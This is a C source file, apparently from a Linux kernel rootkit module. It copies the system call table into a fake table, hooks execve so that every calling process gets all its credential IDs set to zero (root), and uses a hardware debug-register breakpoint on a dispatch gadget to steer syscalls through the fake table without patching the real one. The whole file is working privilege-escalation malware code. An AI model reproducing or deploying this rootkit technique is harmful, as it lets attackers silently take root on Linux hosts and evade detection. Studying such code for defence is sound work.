#include "syscall_table.h"
#include "hook.h"
#include "dr_breakpoints.h"
#include "utils.h"

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

#define SYSCALL(sys) (t_syscall)sct[__NR_##sys]
#define HOOK(sys, func) fake_sct[__NR_##sys] = (unsigned long)func

static unsigned long fake_sct[436];
static unsigned long *sct;

/*
 * rax -> fake_sct index
 */
void handler(struct pt_regs *regs)
{
  unsigned long off;
  off = ((unsigned long)fake_sct - (unsigned long)sct);
  regs->di += off / sizeof(unsigned long);
}

static asmlinkage int new_sys_execve(const struct pt_regs *pt_regs)
{
  t_syscall orig_syscall = SYSCALL(execve);
  
  /* generating root permissions */
  struct cred *np;
  np = prepare_creds();

  np->uid.val = np->gid.val = 0;
  np->euid.val = np->egid.val = 0;
  np->suid.val = np->sgid.val = 0;
  np->fsuid.val = np->fsgid.val = 0;

  /* commit creds to task_struct of current process */
  commit_creds(np);

  return orig_syscall(pt_regs);
}

int hook_syscall_table(void)
{
  unsigned long gd_addr;
  unsigned long call_sys_addr;

  table_ptr = sys_call_table_retrieve();
  sct = table_ptr;
  if (!sct)
	return -1;

  memcpy(fake_sct, sct, sizeof(fake_sct));

  HOOK(execve, new_sys_execve);

  call_sys_addr = get_syscall_64_addr();
  if (!call_sys_addr)
	return -ENXIO; // set errno to "no such device or address"
  gd_addr = get_gadget_addr(call_sys_addr);
  if (!gd_addr)
	return -ENXIO; // set errno to "no such device or address"
  
  reg_dr_bp(gd_addr, DR_RW_EXECUTE, DR_LEN_1, handler);

  return 0;
}
